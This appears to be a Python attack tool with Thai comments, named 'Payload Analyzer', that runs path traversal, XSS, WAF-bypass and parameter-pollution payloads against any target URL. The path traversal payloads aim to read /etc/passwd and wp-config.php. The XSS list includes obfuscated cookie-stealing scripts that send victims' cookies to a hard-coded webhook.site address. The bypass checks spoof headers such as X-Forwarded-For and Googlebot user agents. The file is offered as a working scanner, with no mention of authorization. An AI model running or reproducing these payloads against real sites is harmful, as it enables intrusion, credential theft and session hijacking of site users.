#!/usr/bin/env python3
"""
Payload Analyzer - เครื่องมือวิเคราะห์และทดสอบ payload สำหรับการโจมตี
รองรับ Path Traversal, XSS, และการ bypass protection
"""

import requests
import urllib.parse
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import json
import sys
import argparse
from typing import List, Dict, Any

class PayloadAnalyzer:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
    def generate_random_string(self, length: int = 8) -> str:
        """สร้างสตริงสุ่ม"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def test_path_traversal_payloads(self) -> List[Dict[str, Any]]:
        """ทดสอบ Path Traversal payloads"""
        print("[+] ทดสอบ Path Traversal payloads...")
        
        path_traversal_payloads = [
            # Basic path traversal
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../wp-config.php",
            "../../../../../../config.php",
            
            # URL encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php",
            
            # Double encoding
            "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fwp-config.php",
            
            # Mixed encoding
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            
            # Null byte injection
            "../../../../../../etc/passwd%00",
            "../../../../../../wp-config.php%00",
            
            # Unicode bypass
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            
            # Alternative separators
            "..\\..\\..\\..\\..\\..\\etc\\passwd",
            "..//..//..//..//..//..//etc//passwd",
            
            # With random parameters
            f"../../../../../../etc/passwd?{self.generate_random_string()}=test",
            f"../../../../../../wp-config.php&{self.generate_random_string()}=bypass",
        ]
        
        results = []
        for payload in path_traversal_payloads:
            try:
                # ทดสอบกับ parameter ต่างๆ
                test_urls = [
                    f"{self.target_url}/index.php?page={payload}",
                    f"{self.target_url}/search?q={payload}",
                    f"{self.target_url}/file?path={payload}",
                    f"{self.target_url}/download?file={payload}",
                    f"{self.target_url}/view?doc={payload}",
                ]
                
                for test_url in test_urls:
                    response = self.session.get(test_url, timeout=self.timeout)
                    result = {
                        'payload': payload,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': 'cloudflare' in response.text.lower() or '403' in str(response.status_code),
                        'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                    }
                    results.append(result)
                    
                    if not result['is_blocked'] and response.status_code == 200:
                        print(f"[+] Potential success: {test_url}")
                        print(f"    Status: {response.status_code}, Length: {len(response.text)}")
                    
                    time.sleep(0.5)  # Delay to avoid rate limiting
                    
            except Exception as e:
                print(f"[-] Error testing {payload}: {e}")
                
        return results
    
    def test_xss_payloads(self) -> List[Dict[str, Any]]:
        """ทดสอบ XSS payloads"""
        print("[+] ทดสอบ XSS payloads...")
        
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Encoded XSS
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # JavaScript events
            "' onmouseover='alert(1)",
            "\" onfocus=\"alert(1)",
            "' onload='alert(1)",
            
            # Cookie stealing
            "<script>var c=String.fromCharCode(99,111,111,107,105,101);var d=String.fromCharCode(100,111,99,117,109,101,110,116);var l=String.fromCharCode(108,111,99,97,116,105,111,110);var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';window[d][l] = a + '/?c=' + encodeURIComponent(window[d][c]);</script>",
            
            # URL encoded cookie stealing
            "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E",
            
            # Alternative cookie stealing
            "<script>var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a + '/?c=' + encodeURIComponent(document.cookie);</script>",
            
            # Bypass techniques
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval('al'+'ert(1)')</script>",
            
            # DOM XSS
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Filter bypass
            "<img src=x onerror=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<iframe src=javascript:alert(1)>",
        ]
        
        results = []
        for payload in xss_payloads:
            try:
                # ทดสอบกับ parameter ต่างๆ
                test_urls = [
                    f"{self.target_url}/search?q={urllib.parse.quote(payload)}",
                    f"{self.target_url}/index.php?page={urllib.parse.quote(payload)}",
                    f"{self.target_url}/comment?text={urllib.parse.quote(payload)}",
                    f"{self.target_url}/user?name={urllib.parse.quote(payload)}",
                ]
                
                for test_url in test_urls:
                    response = self.session.get(test_url, timeout=self.timeout)
                    result = {
                        'payload': payload,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': 'cloudflare' in response.text.lower() or '403' in str(response.status_code),
                        'xss_reflected': payload.replace('<', '&lt;') in response.text or payload in response.text,
                        'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                    }
                    results.append(result)
                    
                    if result['xss_reflected'] and not result['is_blocked']:
                        print(f"[+] XSS payload reflected: {test_url}")
                        print(f"    Payload: {payload}")
                    
                    time.sleep(0.5)
                    
            except Exception as e:
                print(f"[-] Error testing XSS {payload}: {e}")
                
        return results
    
    def test_bypass_techniques(self) -> List[Dict[str, Any]]:
        """ทดสอบเทคนิคการ bypass protection"""
        print("[+] ทดสอบเทคนิคการ bypass protection...")
        
        bypass_techniques = [
            # User-Agent rotation
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'},
            
            # Headers manipulation
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            
            # Accept headers
            {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
            {'Accept': 'text/plain,text/html'},
            
            # Language headers
            {'Accept-Language': 'en-US,en;q=0.9'},
            {'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'},
        ]
        
        results = []
        test_payload = "../../../../../../etc/passwd"
        
        for technique in bypass_techniques:
            try:
                # สร้าง session ใหม่สำหรับแต่ละเทคนิค
                test_session = requests.Session()
                test_session.headers.update(technique)
                
                test_url = f"{self.target_url}/index.php?page={test_payload}"
                response = test_session.get(test_url, timeout=self.timeout)
                
                result = {
                    'technique': technique,
                    'url': test_url,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'is_blocked': 'cloudflare' in response.text.lower() or '403' in str(response.status_code),
                    'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                }
                results.append(result)
                
                if not result['is_blocked'] and response.status_code == 200:
                    print(f"[+] Bypass successful with technique: {technique}")
                    print(f"    Status: {response.status_code}, Length: {len(response.text)}")
                
                time.sleep(1)  # Longer delay for bypass attempts
                
            except Exception as e:
                print(f"[-] Error testing bypass technique {technique}: {e}")
                
        return results
    
    def test_parameter_pollution(self) -> List[Dict[str, Any]]:
        """ทดสอบ HTTP Parameter Pollution"""
        print("[+] ทดสอบ HTTP Parameter Pollution...")
        
        pollution_payloads = [
            # Multiple parameters with same name
            "page=../../../../../../etc/passwd&page=normal",
            "page=normal&page=../../../../../../etc/passwd",
            
            # Array parameters
            "page[]=../../../../../../etc/passwd&page[]=normal",
            "page[0]=../../../../../../etc/passwd&page[1]=normal",
            
            # Mixed encoding
            "page=../../../../../../etc/passwd&page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # Different parameter names
            "page=../../../../../../etc/passwd&file=normal&path=../../../../../../wp-config.php",
        ]
        
        results = []
        for payload in pollution_payloads:
            try:
                test_url = f"{self.target_url}/index.php?{payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                result = {
                    'payload': payload,
                    'url': test_url,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'is_blocked': 'cloudflare' in response.text.lower() or '403' in str(response.status_code),
                    'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                }
                results.append(result)
                
                if not result['is_blocked'] and response.status_code == 200:
                    print(f"[+] Parameter pollution successful: {test_url}")
                    print(f"    Status: {response.status_code}, Length: {len(response.text)}")
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] Error testing parameter pollution {payload}: {e}")
                
        return results
    
    def run_full_analysis(self) -> Dict[str, Any]:
        """รันการวิเคราะห์ทั้งหมด"""
        print(f"[+] เริ่มการวิเคราะห์ payload สำหรับ: {self.target_url}")
        print("=" * 60)
        
        results = {
            'target_url': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'path_traversal': self.test_path_traversal_payloads(),
            'xss': self.test_xss_payloads(),
            'bypass_techniques': self.test_bypass_techniques(),
            'parameter_pollution': self.test_parameter_pollution()
        }
        
        # สรุปผลลัพธ์
        print("\n" + "=" * 60)
        print("สรุปผลการวิเคราะห์:")
        print(f"Path Traversal tests: {len(results['path_traversal'])}")
        print(f"XSS tests: {len(results['xss'])}")
        print(f"Bypass technique tests: {len(results['bypass_techniques'])}")
        print(f"Parameter pollution tests: {len(results['parameter_pollution'])}")
        
        # นับผลลัพธ์ที่สำเร็จ
        successful_path_traversal = sum(1 for r in results['path_traversal'] if not r['is_blocked'] and r['status_code'] == 200)
        successful_xss = sum(1 for r in results['xss'] if r['xss_reflected'] and not r['is_blocked'])
        successful_bypass = sum(1 for r in results['bypass_techniques'] if not r['is_blocked'] and r['status_code'] == 200)
        successful_pollution = sum(1 for r in results['parameter_pollution'] if not r['is_blocked'] and r['status_code'] == 200)
        
        print(f"\nผลลัพธ์ที่สำเร็จ:")
        print(f"- Path Traversal: {successful_path_traversal}")
        print(f"- XSS Reflected: {successful_xss}")
        print(f"- Bypass Techniques: {successful_bypass}")
        print(f"- Parameter Pollution: {successful_pollution}")
        
        return results
    
    def save_results(self, results: Dict[str, Any], filename: str = None):
        """บันทึกผลลัพธ์เป็นไฟล์ JSON"""
        if filename is None:
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f"payload_analysis_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] บันทึกผลลัพธ์ลงไฟล์: {filename}")

def main():
    parser = argparse.ArgumentParser(description='Payload Analyzer - เครื่องมือวิเคราะห์และทดสอบ payload')
    parser.add_argument('url', help='URL เป้าหมายที่ต้องการทดสอบ')
    parser.add_argument('-o', '--output', help='ไฟล์ output (JSON)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout สำหรับการเชื่อมต่อ (วินาที)')
    parser.add_argument('--path-traversal-only', action='store_true', help='ทดสอบเฉพาะ Path Traversal')
    parser.add_argument('--xss-only', action='store_true', help='ทดสอบเฉพาะ XSS')
    
    args = parser.parse_args()
    
    analyzer = PayloadAnalyzer(args.url, args.timeout)
    
    if args.path_traversal_only:
        results = analyzer.test_path_traversal_payloads()
        print(f"\n[+] ทดสอบ Path Traversal เสร็จสิ้น: {len(results)} tests")
    elif args.xss_only:
        results = analyzer.test_xss_payloads()
        print(f"\n[+] ทดสอบ XSS เสร็จสิ้น: {len(results)} tests")
    else:
        results = analyzer.run_full_analysis()
        analyzer.save_results(results, args.output)

if __name__ == "__main__":
    main()